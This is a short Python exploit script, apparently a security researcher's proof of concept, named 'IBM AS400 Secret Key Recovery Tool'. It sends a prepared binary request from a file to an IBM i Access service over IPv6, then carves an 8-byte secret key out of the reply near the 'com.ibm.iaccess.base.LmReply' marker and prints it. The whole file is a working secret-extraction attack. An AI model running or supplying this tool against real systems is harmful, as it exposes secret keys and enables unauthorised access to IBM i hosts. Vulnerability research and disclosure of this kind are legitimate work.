#!/usr/bin/env python3.10

import sys
import socket
import binascii

def send_binary_data(ip, port, file_path):
    with open(file_path, "rb") as file:
        binary_data = file.read()

    try:
        with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as s:
            s.connect((ip, port, 0, 0))
            s.sendall(binary_data)
            received_data=b''

            for i in range(5):
                tmp_buffer = s.recv(4096)  # Adjust the buffer size as needed
                if not tmp_buffer:
                    break;
                received_data+=tmp_buffer
            hex_result = binascii.hexlify(bytes(received_data))
            print(f"\033[31mReceived data len: {len(received_data)}\033[0m")
            print(f"\033[33mReceived data in hex format: {hex_result}\033[0m")
            ascii_result=binascii.unhexlify(hex_result.decode())
            print(f"\033[33mReceived data in ascii format: {ascii_result}\033[0m")
            reply_idx=ascii_result.rfind(b"com.ibm.iaccess.base.LmReply")
            secret_key=ascii_result[reply_idx-12:reply_idx-4]
            print(f"\n\033[32mSecret key: {secret_key.decode()}\033[0m\n")

    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    print("\nIBM AS400 Secret Key Recovery Tool v0.2 by Michal Majchrowicz AFINE Team\n")
    ipv6_address = "::1"  # localhost in IPv6 format
    file_path = "key_request.bin"  # Replace with the actual file path
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <port_number> [<server_ipv6_address]\n")
        exit(-1)
    port_number = int(sys.argv[1])
    if len(sys.argv) > 2:
        ipv6_address = sys.argv[2]

    send_binary_data(ipv6_address, port_number, file_path)
